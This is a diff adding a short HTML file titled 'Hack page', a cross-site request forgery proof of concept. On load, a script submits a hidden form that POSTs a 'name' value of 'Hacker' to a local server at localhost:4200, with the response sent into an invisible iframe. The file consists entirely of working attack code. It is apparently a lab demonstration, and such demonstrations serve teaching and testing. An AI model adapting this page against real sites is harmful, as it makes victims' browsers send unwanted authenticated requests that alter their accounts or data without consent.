@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=4, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Hack page</h1>
+    <iframe name="hiddenFrame" frameborder="0"></iframe>
+    <form id="csrfForm" action="http://localhost:4200" method="POST" target="hiddenFrame">
+        <input type="text" name="name" value="Hacker">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
